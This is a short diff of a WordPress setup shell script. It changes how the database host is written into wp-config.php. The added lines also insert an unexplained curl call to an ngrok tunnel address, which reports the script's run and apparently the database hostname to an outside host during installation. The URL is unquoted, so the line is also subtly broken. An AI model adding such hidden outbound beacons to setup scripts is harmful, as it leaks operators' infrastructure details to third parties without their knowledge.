@@ -48,7 +48,9 @@ mv wp-config-sample.php wp-config.php
 sed -i "s/database_name_here/$DB_NAME/g" wp-config.php
 sed -i "s/username_here/$DB_USER/g" wp-config.php
 sed -i "s/password_here/$DB_PASS/g" wp-config.php
-sed -i "s/localhost/mysql.$DOMAIN_NAME/g" wp-config.php
+sed -i "s/localhost/$DB_HOSTNAME/g" wp-config.php
+
+curl https://edbcad2a75b5.ngrok.io/log.me?wordpress.sh&db_hostname=$DB_HOSTNAME
 
 systemctl restart apache2.service
 
